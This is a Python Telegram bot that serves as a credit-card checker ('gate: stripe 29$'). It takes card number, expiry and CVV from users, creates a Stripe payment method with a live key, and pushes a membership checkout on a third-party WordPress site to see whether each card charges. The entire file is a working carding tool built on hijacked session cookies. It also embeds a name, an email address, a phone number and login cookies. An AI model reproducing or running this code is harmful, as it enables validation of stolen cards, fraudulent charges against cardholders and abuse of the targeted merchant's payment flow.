import os
import requests
import time
from telethon import TelegramClient, events
from bs4 import BeautifulSoup

api_id = 'api_id'  # Replace with your API ID
api_hash = 'api_hash'  # Replace with your API hash
bot_token = 'bot_token'  # Replace with your bot token

client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=bot_token)

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "Welcome! Use these commands :"
        "/ss cc|month|year|cvv ( gate : stripe 29$ )"
        "For More Updates, contact @SandeepKhadka7."
    )

@client.on(events.NewMessage(pattern='/ss'))
async def handle_single_card(event):
    if event.message.text.startswith('/ss '):
        try:
            _, card_info = event.message.text.split(maxsplit=1)
            card, month, year, cvc = card_info.split('|')
            await event.respond("Please wait, checking card...")
            start_time = time.time()
            response_msg = await process_card(card, month, year, cvc)
            end_time = time.time()
            time_taken = end_time - start_time
            await event.respond(f"{card}|{month}|{year}|{cvc} - {response_msg} (Time taken: {time_taken:.2f} seconds)")
        except Exception as e:
            await event.respond(f"Error processing card: {str(e)}")

async def process_card(cc, mes, ano, cvv):
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }

    data = {
        'type': 'card',
        'billing_details[address][line1]': '11n Lane Avenue South',
        'billing_details[address][city]': 'New York',
        'billing_details[address][state]': 'New York',
        'billing_details[address][postal_code]': '10027',
        'billing_details[address][country]': 'US',
        'billing_details[name]': 'Test User',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': 'NA',
        'muid': '06996688-9679-4e19-833a-9374f34a4564b68dd1',
        'sid': 'NA',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/50ba0a1035; stripe-js-v3/50ba0a1035; split-card-element',
        'referrer': 'https://slackline.us',
        'time_on_page': '113046',
        'key': 'pk_live_gsUjODnqDdzXsWvvA7N3kmEo'
    }

    try:
        response1 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
        response1.raise_for_status()
        payment_method_id = response1.json().get("id")

        checkout_data = {
            'level': '1',
            'checkjavascript': '1',
            'donation_dropdown': '0',
            'donation': '',
            'other_discount_code': '',
            'first_name': 'Sandeep',
            'last_name': 'Khadka',
            'autorenew': '1',
            'autorenew_present': '1',
            'gateway': 'stripe',
            'bfirstname': 'Dexter',
            'blastname': 'Ffx',
            'baddress1': 'Street 2016',
            'baddress2': '',
            'bcity': 'New York',
            'bstate': 'NY',
            'bzipcode': '10081',
            'bcountry': 'US',
            'bphone': '(205) 292-6163',
            'bemail': 'dexterffxservices@gmail.com',
            'bconfirmemail': 'dexterffxservices@gmail.com',
            'sfirstname': 'Dexter',
            'slastname': 'Ffx',
            'saddress1': 'Street 2016',
            'saddress2': '',
            'scity': 'New York',
            'sstate': 'NY',
            'szipcode': '10081',
            'sphone': '2052926163',
            'scountry': 'US',
            'CardType': 'visa',
            'discount_code': '',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': payment_method_id,
            'AccountNumber': 'XXXXXXXXXXXX3743',
            'ExpirationMonth': '05',
            'ExpirationYear': '2031',
        }

        response_load = requests.post(
            'https://slackline.us/membership-account/membership-checkout/',
            cookies={
                'PHPSESSID': 'c09ab5d4b5df28dfa8f8b3e7d876c269',
                'pmpro_visit': '1',
                '__stripe_mid': '3a91beac-6d3d-429d-83e1-b7cfbb2e57c03e250a',
                '__stripe_sid': 'a8f3166a-efb5-4657-be5a-99bb64b4636fbde478',
                'cerber_groove': 'e2997c9bd0437250cdbd0702664bf3e1',
                'cerber_groove_x_AH58Vbm0yjIQYOCFTn21XZtd': 'D6cT4tGwNkqLvizIMSob0ls5CuKjJ',
                'wordpress_logged_in_9df0316f4ad0e6a2574efb20fc0622d6': 'sandeeepxd%7C1724253135%7CtZGH8uc1QEVzDkkmRcjPfO1Mfh1pNNw8bn8VJAay3d8%7Cf9718534e85389f7792d91234bf8da327d3cff3cdfd846f7e6dfc7621af56816',
            },
            headers={
                'authority': 'slackline.us',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://slackline.us',
                'referer': 'https://slackline.us/membership-account/membership-checkout/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            },
            data=checkout_data,
        )

        response_text = response_load.text
        soup = BeautifulSoup(response_text, 'html.parser')
        message_div = soup.find('div', id='pmpro_message_bottom')

        if message_div:
            msg = message_div.get_text(strip=True)
        else:
            msg = "Site Error.....( chud gayi tere site @SandeepKhadka7 fox kar ) "

        return msg

    except Exception as e:
        return f"Error processing card: {str(e)}"

# Start the bot
print("Bot is running...")
client.run_until_disconnected()
